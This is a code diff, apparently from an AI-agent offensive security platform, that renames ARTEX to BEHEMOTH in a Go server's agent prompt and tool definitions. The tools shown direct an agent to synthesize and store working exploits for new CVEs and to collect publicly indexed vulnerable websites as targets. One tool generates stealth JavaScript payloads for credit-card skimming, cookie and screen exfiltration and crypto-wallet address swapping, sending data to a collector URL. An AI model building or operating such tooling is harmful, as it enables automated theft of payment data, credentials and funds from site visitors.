@@ -10,11 +10,11 @@ import (
 	"strings"
 	"time"
 
-	"github.com/Autumn-27/artex/agent/payloads"
-	"github.com/Autumn-27/artex/agent/research"
-	"github.com/Autumn-27/artex/db"
-	"github.com/Autumn-27/artex/server/patchmonitor"
-	"github.com/Autumn-27/artex/server/search"
+	"github.com/Autumn-27/behemoth/agent/payloads"
+	"github.com/Autumn-27/behemoth/agent/research"
+	"github.com/Autumn-27/behemoth/db"
+	"github.com/Autumn-27/behemoth/server/patchmonitor"
+	"github.com/Autumn-27/behemoth/server/search"
 	actool "github.com/Autumn-27/norma/tool"
 )
 
@@ -372,7 +372,7 @@ func (s *Server) launchPatchWatchAgentRun(profileID *int64, newVulns []patchmoni
 			"1. Call `check_proxy_status` first to check if Proxy Pool or Global Proxy is enabled (connect directly if `proxy_enabled` is false; rotate via `manage_proxy_pool` if a proxy is degraded).\n"+
 			"2. Call `check_patch_feeds` to review the latest vulnerabilities and `generate_vuln_exploit` on the highest-priority vulnerability ID to synthesize a PoC exploit.\n"+
 			"3. Proactively expand watch coverage: if any major vendor, framework, or community security feed (e.g., Hacker News topic RSS, vendor PSIRT RSS/Atom, GitHub Releases Atom) relevant to the discovered technologies is not yet in `check_patch_feeds`, register and poll it via `add_patch_watch_feed`.\n"+
-			"4. Call `match_vuln_targets` to correlate the affected technology/software against ARTEX's registered authorized Assets & Scope inventory (`assets` & `exploit_targets`). Verify in-scope assets safely and update via `update_exploit_target_status`.\n"+
+			"4. Call `match_vuln_targets` to correlate the affected technology/software against BEHEMOTH's registered authorized Assets & Scope inventory (`assets` & `exploit_targets`). Verify in-scope assets safely and update via `update_exploit_target_status`.\n"+
 			"5. Call `discover_affected_sites_for_notification` for the primary vulnerable technology/product so publicly indexed websites using that technology (along with their `/.well-known/security.txt` contacts) are enrolled into the Targets list (`notify_candidate`) for responsible vulnerability notification (never execute active exploits against out-of-scope notification candidates).\n"+
 			"6. Output a concise intelligence briefing summarizing watched advisories, newly added watch feeds, generated PoCs, matched in-scope targets, and discovered notification candidates.",
 		sourcesChecked, strings.Join(summaryLines, "\n"),
@@ -413,7 +413,7 @@ func (s *Server) patchMonitorTools() []actool.CoreTool {
 // verified Patch Monitor exploits (self-improving scanner templates).
 func (s *Server) toolSyncNucleiTemplates() actool.CoreTool {
 	return wrTool("sync_nuclei_templates",
-		"Regenerate ARTEX's private nuclei template repository from verified Patch Monitor exploits (writes nuclei YAML templates to <data>/nuclei-templates/artex and prunes stale ones). Subsequent nuclei-scan runs automatically include these templates, making the scanner self-improving as more exploits are verified.",
+		"Regenerate BEHEMOTH's private nuclei template repository from verified Patch Monitor exploits (writes nuclei YAML templates to <data>/nuclei-templates/behemoth and prunes stale ones). Subsequent nuclei-scan runs automatically include these templates, making the scanner self-improving as more exploits are verified.",
 		objSchema(map[string]any{}),
 		func(_ context.Context, _ json.RawMessage) (actool.Result, error) {
 			if s.patchMon == nil {
@@ -434,7 +434,7 @@ func (s *Server) toolSyncNucleiTemplates() actool.CoreTool {
 
 func (s *Server) toolSearchPatchArsenal() actool.CoreTool {
 	return roTool("search_patch_arsenal",
-		"Search ARTEX Patch Monitor's existing vulnerabilities, auto-generated PoC exploits, and verified client-side payloads by CVE ID, library/technology name (e.g. 'jQuery', 'Bootstrap', 'PHP', 'WordPress', 'OpenSSH'), or vulnerability class ('XSS', 'SQLi', 'RCE', 'LFI', 'cookie_exfil'). ALWAYS call this FIRST when you detect an outdated library, CVE, or vulnerability class on a target so you can reuse existing exploits/payloads before building one from scratch!",
+		"Search BEHEMOTH Patch Monitor's existing vulnerabilities, auto-generated PoC exploits, and verified client-side payloads by CVE ID, library/technology name (e.g. 'jQuery', 'Bootstrap', 'PHP', 'WordPress', 'OpenSSH'), or vulnerability class ('XSS', 'SQLi', 'RCE', 'LFI', 'cookie_exfil'). ALWAYS call this FIRST when you detect an outdated library, CVE, or vulnerability class on a target so you can reuse existing exploits/payloads before building one from scratch!",
 		objSchema(map[string]any{
 			"query": strParam("CVE ID, technology/library name, or vulnerability class (e.g. 'jQuery', 'CVE-2020-11022', 'XSS', 'Bootstrap', 'SQLi')"),
 			"limit": map[string]any{"type": "integer", "description": "Max items to return (default 15)"},
@@ -467,7 +467,7 @@ func (s *Server) toolSearchPatchArsenal() actool.CoreTool {
 
 func (s *Server) toolSaveVerifiedExploitToPatchMonitor() actool.CoreTool {
 	return wrTool("save_verified_exploit_to_patch_monitor",
-		"Persist a newly synthesized and verified working PoC exploit or payload (along with its CVE / affected library / version metadata) into ARTEX Patch Monitor (`patch_vulnerabilities` + `generated_exploits` with status='verified_working') so future scans and agents can immediately reuse it.",
+		"Persist a newly synthesized and verified working PoC exploit or payload (along with its CVE / affected library / version metadata) into BEHEMOTH Patch Monitor (`patch_vulnerabilities` + `generated_exploits` with status='verified_working') so future scans and agents can immediately reuse it.",
 		objSchema(map[string]any{
 			"title":             strParam("Vulnerability & PoC title (e.g. 'jQuery < 3.5.0 htmlPrefilter Self-Closing Tag XSS PoC')"),
 			"code":              strParam("Complete, self-contained, verified working PoC exploit or payload code"),
@@ -697,7 +697,7 @@ func (s *Server) unconfiguredSearchEngines() []string {
 
 func (s *Server) toolMatchVulnTargets() actool.CoreTool {
 	return wrTool("match_vuln_targets",
-		"Correlate tracked CVEs and generated exploits against ARTEX's registered authorized Assets & Scope inventory by technology/product fingerprint, auto-enroll matching in-scope websites/services into Patch Monitor Targets, and return the full target list.",
+		"Correlate tracked CVEs and generated exploits against BEHEMOTH's registered authorized Assets & Scope inventory by technology/product fingerprint, auto-enroll matching in-scope websites/services into Patch Monitor Targets, and return the full target list.",
 		objSchema(map[string]any{}),
 		func(_ context.Context, _ json.RawMessage) (actool.Result, error) {
 			if s.patchMon == nil {
@@ -752,7 +752,7 @@ func (s *Server) toolGeneratePayload() actool.CoreTool {
 		"Automatically generate a stealth client-side offensive JavaScript payload (cc_skimmer, cookie_exfil, crypto_swap_dom, crypto_swap_clipboard, or screen_exfil) and persist it in Patch Monitor.",
 		objSchema(map[string]any{
 			"type":         strParam("Payload type: cc_skimmer | cookie_exfil | crypto_swap_dom | crypto_swap_clipboard | screen_exfil"),
-			"exfil_url":    strParam("Exfiltration collector endpoint URL (e.g. https://collector.artex.local/exfil)"),
+			"exfil_url":    strParam("Exfiltration collector endpoint URL (e.g. https://collector.behemoth.local/exfil)"),
 			"attacker_btc": strParam("Optional replacement BTC address for crypto swap"),
 			"attacker_eth": strParam("Optional replacement ETH address for crypto swap"),
 			"vuln_id":      map[string]any{"type": "integer", "description": "Optional vulnerability ID in Patch Monitor to attach this payload to"},
